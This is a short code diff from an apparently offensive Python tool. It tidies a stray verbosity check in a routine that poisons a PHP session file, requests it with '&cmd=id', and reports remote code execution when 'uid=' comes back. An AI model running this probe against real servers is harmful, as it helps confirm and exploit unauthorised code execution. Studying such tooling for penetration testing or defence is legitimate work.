@@ -359,8 +359,6 @@ class Payload:
                 s.get(newUrl, headers=fetchUA())
                 # open the file to find if the command worked
                 compUrl = self.url + self.cookiePath + value + "&cmd=id"
-                if self.verbosity > 1:
-
                 clean = self.hit(compUrl)	
                 if 'uid='  in clean.lower():
                     print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned')
